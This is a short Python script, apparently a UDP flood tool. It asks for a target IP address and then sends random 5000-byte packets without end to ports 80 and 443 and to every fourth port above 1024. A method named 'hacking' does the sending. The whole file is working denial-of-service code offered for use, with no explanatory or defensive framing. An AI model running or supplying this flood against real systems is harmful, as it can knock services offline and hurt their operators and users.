import socket
import random

site1 = input("enter the IP: ")
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(5000)

class CoursDansLeVide: 
    

    def __init__(self,site):
        self.site = site
        self.port = 1

        self.sent = 0
        

    def hacking(self):
        while True:
            self.sent +=1
            self.port +=1 
            if self.port >= 1024 and self.port % 4 == 0 and self.port <= 65535:
                print(self.port)
                sock.sendto(bytes, (self.site, self.port))
            elif self.port == 443 or self.port == 80:
                print(self.port)
                sock.sendto(bytes, (self.site, self.port))
            elif self.port == 65535:
                self.port = 1 

target = CoursDansLeVide(site1)

target.hacking()
